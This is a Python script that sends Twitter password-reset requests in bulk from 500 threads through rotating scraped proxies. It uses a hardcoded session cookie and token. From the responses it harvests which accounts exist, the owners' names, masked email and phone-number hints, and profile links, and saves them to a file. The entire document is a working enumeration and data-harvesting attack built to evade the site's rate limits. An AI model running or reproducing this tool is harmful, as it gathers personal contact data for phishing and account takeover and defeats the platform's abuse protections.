import requests
import random
import threading
import os
from bs4 import BeautifulSoup

os.system('cls')
print("Loading proxies & usernames.")

pf = open("proxies.txt", "w+")

pf.truncate(0)

r = requests.get("https://api.proxyscrape.com/?request=getproxies&proxytype=socks4&timeout=10000&country=all")

for line in r.text:
    pf.write(line.strip('\n'))

pf = open("proxies.txt")
uf = open("usernames.txt")
output = open("output.txt", "w+")
proxies = pf.readlines()
usernames = uf.readlines()

input("Starting to scrape, output is in output.txt (EVERY LAUNCH, output.txt is WIPED, SAVE YOUR RESULTS BEFORE RUNNING AGAIN!)\n\nConfirm you have read this by pressing enter.")

def check():
    global usernames
    headers = {
        'authority': 'abs.twimg.com',
        'cache-control': 'max-age=0',
        'upgrade-insecure-requests': '1',
        'origin': 'https://twitter.com',
        'content-type': 'application/x-www-form-urlencoded',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
        'accept': 'image/webp,image/apng,image/*,*/*;q=0.8',
        'sec-fetch-site': 'cross-site',
        'sec-fetch-mode': 'no-cors',
        'sec-fetch-user': '?1',
        'sec-fetch-dest': 'image',
        'referer': 'https://twitter.com/account/verify_user_info',
        'accept-language': 'en-US,en;q=0.9',
        'cookie': 'gt=1277517216540393472; personalization_id="v1_NyA3avFkw32yug8WcnBTzA=="; guest_id=v1%3A159341881419198310; ct0=74bda54ac2385c6352b59f54fddf7a30; _sl=1; _ga=GA1.2.1571179687.1593418814; _gid=GA1.2.106094656.1593418814; _gat=1; att=z9XcNYf5UhggH5FBk9AwcOqj4aVRah6f4m9D9cbI; _twitter_sess=BAh7DiIKZmxhc2hJQzonQWN0aW9uQ29udHJvbGxlcjo6Rmxhc2g6OkZsYXNo%250ASGFzaHsABjoKQHVzZWR7ADoPY3JlYXRlZF9hdGwrCPuVKf9yAToMY3NyZl9p%250AZCIlNTBjNWQxOGI2MmM1ZmIxM2I4NzlhMmNkNzRjZjk3MmE6B2lkIiUwN2Mz%250ANDhlMGEwMGI5ZmFmMTJhZGI0MDE3MThhYWMwZiIJcHJycCIAOghwcnNpBzoI%250AcHJ1aQRPg7USOghwcmlpBjoIcHJ2IgYx--8e39d0e9db0c961d6e1f7b1802c921cdd77fceb1',
        'if-none-match': '"CZuZtRuj6c3RP8SK4Fj6Jw=="',
        'if-modified-since': 'Thu, 27 Jun 2019 02:18:02 GMT',
        'Referer': 'https://twitter.com/account/verify_user_info',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
    }


#THE FORMAT OF THE OUTPUT.TXT FILE IS NAME:USERNAME:EMAIL_HINT


    while True:
        try:
            username = random.choice(usernames).strip('\n')
            proxy = random.choice(proxies)
            data = {
                'authenticity_token': '903a48c44b3f4e21703fa0a6509223cc70a70b80',
                'account_identifier': username
            }
            response = requests.post('https://twitter.com/account/begin_password_reset', headers=headers, data=data, proxies={
                                "https": "socks4://" + proxy.strip('\n')
            })
            if "We couldn't find your account with that information" in response.text:
                print("bad")
            elif "Enter your email address to continue" in response.text:
                print("exists but also bad")
            elif "Enter your phone number to continue" in response.text:
                print("exists but phone veri")
            elif "We’ll send you an SMS text" in response.text:
                print("sms")
            elif "Email a link to" in response.text:
                soup = BeautifulSoup(response.text, features='lxml')
                lol = soup.find('strong').get_text()
                name = soup.find("div", {"class":"fullname"}).get_text()
                r = requests.get("https://mobile.twitter.com/" + username)
                #print(r.text)
                try:
                    soup = BeautifulSoup(r.text)
                    mydivs = soup.find_all("a", {"class": "twitter-timeline-link"})
                    url = mydivs[0].text
                    print(url)
                    if "*" not in lol:
                        if url != "":
                            print(f"TRUE | {name} | {username} | Phone Number Ends In {lol} | {url}")
                            try:
                                output.write(str(name) + ":" + str(username) + ":" + "Phone number ends in " + str(lol) + ":" + url + "\n")
                            except:
                                print("Error writing to file, possibly unicode error.")
                        else:
                            print(f"TRUE | {name} | {username} | Phone Number Ends In {lol}")
                            try:
                                output.write(str(name) + ":" + str(username) + ":" + "Phone number ends in " + str(lol) + "\n")
                            except:
                                print("Error writing to file, possibly unicode error.")
                    else:
                        if url != "":
                            print(f"TRUE | {name} | {username} | {lol} | {url}")
                            try:
                                output.write(str(name) + ":" + str(username) + ":" + str(lol) + ":" + str(url) + "\n")
                            except:
                                print("Error writing to file, possibly unicode error.")
                        else:
                            print(f"TRUE | {name} | {username} | {lol}")
                            try:
                                output.write(str(name) + ":" + str(username) + ":" + str(lol) + "\n")
                            except:
                                print("Error writing to file, possibly unicode error.")
                except:
                    if "*" not in lol:
                        print(f"TRUE | {name} | {username} | Phone Number Ends In {lol}")
                        try:
                            output.write(str(name) + ":" + str(username) + ":" + "Phone number ends in " + str(lol) + "\n")
                        except:
                            print("Error writing to file, possibly unicode error.")
                    else:
                        print(f"TRUE | {name} | {username} | {lol}")
                        try:
                            output.write(str(name) + ":" + str(username) + ":" + str(lol) + "\n")
                        except:
                            print("Error writing to file, possibly unicode error.")
                output.flush()
                try:
                    usernames.remove(username + "\n")
                except:
                    print("Error removing username from list | May be possible duplicates in output file.")
                
            elif "You've exceeded the number of attempts" in response.text:
                pass
            else:
                print(response.text)
        except:
            pass
        
for index in range(500):
    x = threading.Thread(target=check)
    x.start()